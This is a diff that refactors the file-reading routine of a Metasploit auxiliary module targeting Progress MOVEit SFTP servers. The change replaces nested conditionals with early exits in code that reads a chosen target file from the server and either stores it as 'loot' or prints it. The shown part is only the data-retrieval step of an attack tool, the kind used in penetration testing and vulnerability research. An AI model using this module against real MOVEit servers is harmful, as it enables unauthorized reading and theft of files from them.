@@ -161,35 +161,35 @@ class MetasploitModule < Msf::Auxiliary
 
   def read_file(sftp, file_path)
     sftp.open!(file_path) do |open_response|
-      if open_response.ok?
-        file_size = sftp.fstat!(open_response[:handle]).size
-
-        sftp.read!(open_response[:handle], 0, file_size) do |read_response|
-          if read_response.ok?
-
-            file_data = read_response[:data].to_s
-
-            if datastore['STORE_LOOT']
-              print_status('Storing the file data to loot...')
-
-              store_loot(
-                file_path,
-                file_data.ascii_only? ? 'text/plain' : 'application/octet-stream',
-                datastore['RHOST'],
-                file_data,
-                datastore['TARGETFILE'],
-                'File read from Progress MOVEit SFTP server'
-              )
-            else
-              print_line(file_data)
-            end
-
-          else
-            print_error('SFTP read failed.')
-          end
-        end
-      else
+      unless open_response.ok?
         print_error('SFTP open failed. Is the TARGETFILE path correct?')
+        break
+      end
+
+      file_size = sftp.fstat!(open_response[:handle]).size
+
+      sftp.read!(open_response[:handle], 0, file_size) do |read_response|
+        unless read_response.ok?
+          print_error('SFTP read failed.')
+          break
+        end
+
+        file_data = read_response[:data].to_s
+
+        if datastore['STORE_LOOT']
+          print_status('Storing the file data to loot...')
+
+          store_loot(
+            file_path,
+            file_data.ascii_only? ? 'text/plain' : 'application/octet-stream',
+            datastore['RHOST'],
+            file_data,
+            datastore['TARGETFILE'],
+            'File read from Progress MOVEit SFTP server'
+          )
+        else
+          print_line(file_data)
+        end
       end
     ensure
       sftp.close!(open_response[:handle]) if open_response.ok?
